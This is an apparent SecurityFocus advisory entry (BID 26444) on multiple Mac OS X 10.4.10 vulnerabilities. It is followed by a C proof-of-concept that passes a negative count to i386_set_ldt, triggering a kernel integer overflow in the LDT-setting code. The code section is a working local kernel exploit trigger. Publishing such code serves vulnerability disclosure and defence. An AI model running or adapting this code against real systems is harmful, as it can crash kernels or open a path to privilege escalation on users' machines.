source: http://www.securityfocus.com/bid/26444/info

Apple Mac OS X is prone to multiple security vulnerabilities.

These issues affect Mac OS X and various applications, including AppleRAID, CFFTP, CFNetwork, CoreFoundation, CoreText, kernel, remote_cmds, networking, NFS, NSURL, SecurityAgent, WebCore, and WebKit.

Attackers may exploit these issues to execute arbitrary code, trigger denial-of-service conditions, escalate privileges, and potentially compromise vulnerable computers.

Apple Mac OS X 10.4.10 and prior versions are vulnerable to these issues. 

#include <stdio.h>
#include <stdlib.h>
#include <architecture/i386/table.h>
#include <i386/user_ldt.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>

int
main(void)
{
    union ldt_entry descs;
    char *buf;
    u_long pgsz = sysconf(_SC_PAGESIZE);

    if ((buf = (char *)malloc(pgsz * 4)) == -1) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    memset(buf, 0x41, pgsz * 4);

    buf = (char *)(((u_long)buf & ~pgsz) + pgsz);

    if (mprotect((char *)((u_long)buf + (pgsz * 2)), (size_t)pgsz,
    PROT_WRITE) == -1) {
        perror("mprotect");
        exit(EXIT_FAILURE);
    }

    /*
     * This will result in kalloc() size argument being 0x00000000 and copyin()
     * size argument being 0xfffffff8.
     */

    if (i386_set_ldt(1024, (union ldt_entry *)&buf, -1) == -1) {
        perror("i386_set_ldt");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}
